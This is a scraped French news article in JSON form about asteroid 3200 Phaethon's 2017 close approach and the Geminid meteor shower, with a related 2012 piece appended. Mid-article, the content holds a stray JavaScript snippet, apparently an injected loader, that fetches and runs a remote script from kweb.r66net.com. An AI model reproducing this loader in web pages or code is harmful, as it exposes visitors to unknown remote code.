{"title": "L'asteroide Phaeton, associe aux Geminides, va << froler >> la Terre", "newspaper": "Futura Sciences", "author": ["Xavier Demeersman"], "date_publi": "2017-11-28", "content": "La tres belle pluie d'etoiles filantes des Geminides, dont le pic d'activite se produira cette annee dans la nuit du 13 au 14 decembre, est vraisemblablement alimentee par Phaeton. Deux jours plus tard, le 16 decembre, ce corps celeste de 5 km atteindra sa plus petite distance avec la Terre depuis plus de 40 ans. L'evenement est une excellente occasion pour les astronomes d'en apprendre plus sur cet astre qui ressemble a un asteroide. Ce qu'il faut retenir Le 16 decembre, l'asteroide 3200 Phaeton fera son passage le plus proche de la Terre depuis 1974. Les astronomes saisissent l'occasion pour obtenir le meilleur portrait jamais realise de ce corps celeste decouvert en 1983. L'une des plus belles pluies d'etoiles filantes de l'annee, les Geminides, est associee a cet objet qui pourrait etre un noyau inactif de comete. Le 16 decembre prochain, Phaeton -- de son vrai nom 3200 Phaeton (1983 TB) -- fera son passage le plus rapproche de la Terre depuis 1974. Mesurant, d'apres les observations passees, environ 5 km, il est le troisieme plus gros  asteroide geocroiseur potentiellement dangereux . Mais pas de panique pour cette nouvelle visite : l'objet passera a quelque 10 millions de kilometres, soit pres de 27 fois la distance moyenne entre notre planete et la  Lune .  Cette proximite, qui ne presente donc aucun danger est, surtout, une formidable occasion pour les chercheurs d'eclaircir la nature ambigue de cet objet celeste decouvert au debut de l' automne  1983. (Il n'y aura pas d'aussi faible distance entre la Terre et Phaeton avant 2093.) A Goldstone et a Arecibo, on se prepare a cette visite.  << Nous esperons obtenir des images detaillees avec des resolutions aussi fines que 75 m par pixel a Goldstone et 15 m par pixel avec Arecibo , s'enthousiasme l'equipe de l'antenne de Goldstone.  Les images devraient etre excellentes pour obtenir un modele 3D detaille. >> Bien que son nom signifie a l'origine en grec ancien << brillant >>, Phaeton est un objet plutot sombre. Les astronomes ont choisi de l'appeler ainsi car au cours de son  orbite  tres elliptique d'une annee et demie, il s'approche jusqu'a 20 millions de kilometres seulement du Soleil, lors de son perihelie. Dans la mythologie grecque, Phaeton est le fils d'Helios et de Clymene qui, un peu vantard, avait fini par convaincre son pere de pouvoir conduire le char du Soleil a travers la voute celeste. Mais malheureusement pour lui -- et heureusement pour tout le monde --, tres maladroit, effraye par les creatures du zodiaque (notamment par le Scorpion) et ne parvenant pas a maitriser les chevaux, il fut foudroye par Zeus avant qu'il ne renverse le char et embrase la Terre et le ciel... Video en accelere de la pluie d'etoiles filantes des Geminides. (c) Photopill, Youtube Ne manquez pas la belle pluie d'etoiles filantes des Geminides Phaeton intrigue : de par les similitudes de son orbite avec celle des courants de debris a l'origine des Geminides, il est considere comme le corps-parent de cet essaim meteoritique. Toutefois, son comportement fait davantage penser a un  asteroide  qu'a une  comete . A moins qu'il ne soit le  noyau  inactif d'une  comete ... Par le passe, des astronomes ont deja surpris des emissions de poussieres mais les observations ont montre des tailles inferieures a celles qui penetrent notre  atmosphere  lors de la pluie d' etoiles filantes  annuelle. Il est possible neanmoins, comme le proposent les chercheurs, que des sursauts d'activite plus forts nous aient echappe jusqu'a present.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Est-ce que le passage de Phaeton dans le voisinage de la Terre aura un effet sur les Geminides de 2017 ? Pas vraiment. Mais cela ne doit pas dissuader de regarder cet essaim meteoritique qui est -- on ne le dira jamais assez --, l'un des plus beaux de l'annee. Actif entre le 7 et le 17 decembre, il a plusieurs fois fait le bonheur des observateurs avec des pics de 160 meteores par heure a son maximum. Cette annee, cela devrait se produire dans la nuit du 13 au 14 decembre. Le minimum attendu devrait etre de 120 meteores par heure. Alors, n'hesitez pas a braver les nuits fraiches de l'hiver, a l'affut de ces petits grains qui tombent assez lentement dans l'atmosphere. D'autant plus qu'a cette date-la, la Lune sera absente presque toute la nuit. Les Geminides doivent leur nom a la position du radiant au sein des Gemeaux. Situee au-dessus d'Orion, la constellation est tres haute dans le firmament au coeur des nuits d'hiver, aux latitudes moyennes. Pour en savoir plus et ne pas rater ce genre d'evenements, consultez nos ephemerides astronomiques : Voir aussi : Les ephemerides de Futura Pour en savoir plus Etoiles filantes : la tres belle surprise des Geminides Article de Jean-Baptiste Felmann publie le 17 decembre 2012 L'un des plus beaux  essaims meteoritiques  de l'annee a de nouveau comble les observateurs les moins frileux avec un maximum d'activite spectaculaire les 13 et 14 decembre, accompagne pour la premiere fois d'une autre pluie d'etoiles filantes. Suivez l'actualite astronomique grace aux  ephemerides Certains  spectacles celestes  ne sont reserves qu'aux plus motives des astronomes ; c'est le cas de l'essaim meteoritique des  Geminides  qui, chaque annee, ponctue la fin de l' automne  par un beau festival celeste. Si le ciel est clair, il faut se preparer a passer deux ou trois nuits dans un froid glacial, loin de toute  pollution lumineuse , pour pouvoir admirer quelques-unes des poussieres abandonnees par 3200 Phaeton et qui se consument dans un eclat de  lumiere  lorsqu'elles traversent l'atmosphere terrestre. Ce n'est pas l'astrophotographe Babak Tafreshi qui nous contredira, lui qui en decembre 2011 avait choisi les  monts Karkas  au coeur de l'Iran pour mener la chasse aux Geminides. Geminide traversant le ciel au-dessus des montagnes, en Iran. (c) Amirreza Kamkar                       Mais qui est donc 3200 Phaeton ? Si l'essaim des Geminides est connu depuis le XIX e  siecle (il tire son nom de la  constellation des Gemeaux  d'ou semblent jaillir ces meteores), 3200 Phaeton a ete decouvert au mois d'avril 1983 par le satellite  infrarouge  Iras. On a d'abord pense qu'il s'agissait d'un  asteroide , mais son orbite suggere qu'il s'agit plus vraisemblablement d'une tres ancienne  comete  trop usee pour developper une chevelure et une queue. Une brillante Geminide (on peut comparer son eclat a celui de Jupiter, au centre de l'image) survole les Flatirons, des formations rocheuses dans le Colorado. (c) Patrick Cullis                               La surprise de 2012 : des meteores associes a 46P/Wirtanen Actif du 7 au 17 decembre, l'essaim des Geminides peut produire a son maximum plus de 100 meteores a l'heure (une  frequence  comparable aux  Perseides  du mois d'aout) avec en prime de nombreuses etoiles filantes tres brillantes. Cette annee les observateurs etaient avantages par l'absence de la  Lune . Apres une derniere apparition a l' aube  avec  Mercure et Venus  le 12 decembre, notre satellite naturel se faisait discret avant son retour dans le ciel du soir a partir du 16. Des conditions ideales pour observer le maximum d'activite des Geminides dans un ciel bien noir les 13 et 14 decembre, et ceux qui ont echappe aux  nuages  n'ont pas ete decus.  Contrairement a ce que peut laisser penser cette image realisee sur l'ile grecque de Corfou, l'observation des Geminides ne necessite aucun instrument astronomique. (c) Bill Metallinos                       De tres beaux meteores particulierement lumineux ont ete observes et photographies, que ce soit sous les  aurores boreales  depuis le nord de l'Europe, en Grece ou encore dans le  desert  de l'Arizona. Mais la surprise est venue de l'etude des orbites de 56 meteores enregistres la nuit du 12 au 13 decembre dans le sud des Etats-Unis par un reseau de cameras automatiques de la  Nasa . En plus des etoiles filantes dont la trajectoire correspond a celles des Geminides, plusieurs meteores d'une autre origine ont ete enregistres. Leur trajectoire laisse supposer qu'ils sont associes a la comete periodique  46P/Wirtanen , une comete a courte periode (5,4 ans) decouverte en 1948. Ce nouveau courant meteoritique, qui pourrait produire jusqu'a 30 meteores par heure, a commence a se manifester pour la premiere fois le 10 decembre avec le passage d'un meteore tres lent dont la  luminosite  etait comparable a celle de  Jupiter . Le spectacle est total au-dessus du lac glaciaire Jokulsarlon, en Islande, avec une aurore boreale, la Voie lactee et le passage d'une Geminide. (c)  Iurie Belegurschi Photography                               Les chasseurs d'etoiles filantes peuvent maintenant passer les fetes de fin d'annee bien au chaud avant de retourner contempler le ciel la premiere semaine de janvier, ou un autre essaim tres actif les attend, celui des Quadrantides. Mission Aida : comment devier un asteroide pouvant frapper la Terre ?                       La mission Aida est destinee a tester la deviation d'un asteroide avec un impacteur, un petit engin propulse a grande vitesse et venant s'ecraser a la surface de l'astre. L'Esa (Agence spatiale europeenne) nous en dit plus au cours de cette video de presentation du projet.                                       ", "theme": "sciences"}